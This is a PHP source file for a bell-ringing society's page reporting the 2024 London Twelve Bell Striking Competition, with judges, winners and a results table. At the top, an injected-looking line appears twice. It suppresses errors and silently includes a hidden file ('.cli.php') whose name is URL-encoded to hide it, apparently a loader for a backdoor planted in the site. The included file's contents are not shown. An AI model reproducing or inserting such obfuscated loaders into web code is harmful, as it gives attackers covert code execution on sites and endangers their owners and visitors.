<?php error_reporting(0);
@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
<?php error_reporting(0);
@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
<?php include('include/pagetop.php'); ?>
<?php include('include/class.Results.php'); ?>
<h1>2024 Competition</h1>
<p>Nine bands took part in the fifteenth London Twelve Bell Striking Competition. The competition was held at St. Michael,
    Cornhill on Saturday 26th. October judged by David Hull, Jemima Bleackley and Harry Helyer.</p>

<p>Congratulations to the winning band, representing the 	Ancient Society of College Youths. Results are given below..</p>

<?php
$oResults = new Results();
$oResults->fetch_year(2024);
$oResults->show_table();
?>

<?php include('include/pagebottom.php'); ?>

